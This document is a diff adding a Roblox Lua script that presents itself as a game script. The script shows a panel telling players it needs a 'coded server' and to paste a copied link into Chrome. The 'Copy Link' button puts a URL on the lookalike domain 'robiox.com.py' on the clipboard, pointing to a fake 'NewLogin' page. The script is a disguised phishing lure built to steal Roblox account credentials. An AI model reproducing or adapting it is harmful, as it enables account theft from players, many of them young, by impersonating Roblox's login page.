@@ -1,0 +1,87 @@
+local plr = game.Players.LocalPlayer
+local plrGui = plr.PlayerGui
+
+local gui = Instance.new("ScreenGui")
+gui.Parent = plrGui
+
+local frame = Instance.new("Frame")
+frame.BackgroundTransparency = 0.25
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.Size = UDim2.fromScale(0.498, 0.489)
+frame.Position = UDim2.fromScale(0.251, 0.254)
+frame.Parent = gui
+
+local textA = Instance.new("TextLabel")
+textA.Font = Enum.Font.MontserratBold
+textA.BackgroundTransparency = 1
+textA.Text = "USE CODED SERVER FOR THIS SCRIPT"
+textA.TextColor3 = Color3.new(1, 1, 1)
+textA.TextScaled = true
+textA.Size = UDim2.fromScale(0.879, 0.152)
+textA.Position = UDim2.fromScale(0.06, 0.028)
+textA.Parent = frame
+
+local textB = Instance.new("TextLabel")
+textB.Font = Enum.Font.MontserratMedium
+textB.BackgroundTransparency = 1
+textB.Text = "To get the coded server read below"
+textB.TextColor3 = Color3.fromRGB(147, 147, 147)
+textB.TextScaled = true
+textB.Size = UDim2.fromScale(0.519, 0.087)
+textB.Position = UDim2.fromScale(0.24, 0.18)
+textB.Parent = frame
+
+local textC = Instance.new("TextLabel")
+textC.Font = Enum.Font.MontserratMedium
+textC.BackgroundTransparency = 1
+textC.Text = "1. Click get Coded Server"
+textC.TextColor3 = Color3.fromRGB(147, 147, 147)
+textC.TextScaled = true
+textC.Size = UDim2.fromScale(0.435, 0.073)
+textC.Position = UDim2.fromScale(0.281, 0.301)
+textC.Parent = frame
+
+local textD = Instance.new("TextLabel")
+textD.Font = Enum.Font.MontserratMedium
+textD.BackgroundTransparency = 1
+textD.Text = "2. Put coded server into Chrome"
+textD.TextColor3 = Color3.fromRGB(147, 147, 147)
+textD.TextScaled = true
+textD.Size = UDim2.fromScale(0.502, 0.073)
+textD.Position = UDim2.fromScale(0.249, 0.394)
+textD.Parent = frame
+
+local textE = Instance.new("TextLabel")
+textE.Font = Enum.Font.MontserratMedium
+textE.BackgroundTransparency = 1
+textE.Text = "3. Click play"
+textE.TextColor3 = Color3.fromRGB(147, 147, 147)
+textE.TextScaled = true
+textE.Size = UDim2.fromScale(0.502, 0.073)
+textE.Position = UDim2.fromScale(0.249, 0.491)
+textE.Parent = frame
+
+local textF = Instance.new("TextLabel")
+textF.Font = Enum.Font.MontserratMedium
+textF.BackgroundTransparency = 1
+textF.Text = "4. Enjoy the script!"
+textF.TextColor3 = Color3.fromRGB(147, 147, 147)
+textF.TextScaled = true
+textF.Size = UDim2.fromScale(0.502, 0.073)
+textF.Position = UDim2.fromScale(0.249, 0.588)
+textF.Parent = frame
+
+local button = Instance.new("TextButton")
+button.BackgroundColor3 = Color3.fromRGB(68, 153, 37)
+button.Font = Enum.Font.MontserratBold
+button.Text = "Copy Link"
+button.TextScaled = true
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Parent = frame
+button.Size = UDim2.fromScale(0.537, 0.173)
+button.Position = UDim2.fromScale(0.23, 0.734)
+
+button.Activated:Connect(function()
+	button.Text = "Link Copied!"
+	setclipboard("https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F281466434325%2Fprofile")
+end)
